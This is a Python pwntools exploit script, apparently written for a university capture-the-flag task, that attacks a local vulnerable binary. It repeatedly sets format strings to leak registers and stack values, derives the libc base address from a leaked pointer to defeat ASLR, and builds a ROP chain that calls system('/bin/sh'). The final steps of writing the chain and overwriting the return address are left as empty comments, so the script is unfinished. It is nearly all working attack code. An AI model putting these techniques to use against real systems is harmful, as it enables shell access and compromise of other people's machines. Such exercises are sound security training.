#!/usr/bin/env python3

import pwn

exe = pwn.ELF("./vuln_patched")
libc = pwn.ELF("./libc.so.6")
ld = pwn.ELF("./ld-linux-x86-64.so.2")

pwn.context.arch = 'amd64'
#pwn.context.binary = exe

#conn = pwn.remote('tasks.ws24.softsec.rub.de', 33311)
conn = pwn.process([exe.path])

pwn.gdb.attach(conn)


def set_format_string(fmt):
    # invert byte string, as we have to write last byte first
    fmt = fmt[::-1]
    for pos, byte in enumerate(fmt):
        conn.recvuntil(b'Option? 1:set 2:print\n> ')
        conn.send(b'1\n')
        conn.recvuntil(b'What is the length of the new format?\n> ')
        length = len(fmt)-pos
        conn.send(f'{length}\n'.encode('ascii'))
        conn.recvuntil(b'What is the new format?\n> ')
        payload = b'A'*(len(fmt)-pos-1) + byte.to_bytes(1, byteorder='little')
        conn.send(payload)


def print_register_and_memory(max):
    # set format string
    fmt = b''
    for pos in range(1,max+1):
        fmt += b'%' + str(pos).encode('ascii') + b'$llx\n'

    print(f'format string: {fmt.hex()}')

    set_format_string(fmt)

    # get data
    conn.recvuntil(b'Option? 1:set 2:print\n> ')
    conn.send(b'2\n')
    conn.recvuntil(b'Output:\n')

    rdi = conn.recvline()
    rsi = conn.recvline()
    rdx = conn.recvline()
    rcx = conn.recvline()
    r8 = conn.recvline()
    r9 = conn.recvline()

    print(f'rdi = 0x{str(rdi)[(2):-3]}')
    print(f'rsi = 0x{str(rsi)[(2):-3]}')
    print(f'rdx = 0x{str(rdx)[(2):-3]}')
    print(f'rcx = 0x{str(rcx)[(2):-3]}')
    print(f' r8 = 0x{str(r8)[(2):-3]}')
    print(f' r9 = 0x{str(r9)[(2):-3]}')

    for i in range(7,max+1):
        stack = conn.recvline()
        print(f'ret + {(i-6)*8} (input {i}) = 0x{str(stack)[(2):-3]}')
    
    conn.recvuntil(b'\n')


# just for testing, see what we got
print_register_and_memory(200)

# Get ASLR of libc: in rdx (3rd argument is pointer to write+16)
set_format_string(b'%3$llx\n\x00')
conn.recvuntil(b'Option? 1:set 2:print\n> ')
conn.send(b'2\n')
conn.recvuntil(b'Output:\n')
rdx = conn.recvline()

libc_base_address = pwn.u64(pwn.unhex(rdx[:-1]).rjust(8, b'\x00'), endianness='big') - (libc.symbols['write'] + 16)

libc.address = libc_base_address

#system = libc_base_address + libc.symbols['system']
#print(f'system = {hex(system)}')

rop = pwn.ROP(libc)
rop.call(rop.ret)
rop.call(libc.symbols['system'], [next(libc.search(b'/bin/sh\x00'))])

# rop chain has 32 bytes 
print(rop.chain())
print(len(rop.chain()))

# canarie is at input 7 (easy to recognize as 0x00 at the end/start)

# Step 1: write a ropchain somewhere onto the stack (byte for byte)


                




# Step 2: override return address of printf (or other) to jump to my ropchain (first thing ropchain does is adding to rsp to move ropchain to top of stack :)


conn.interactive()


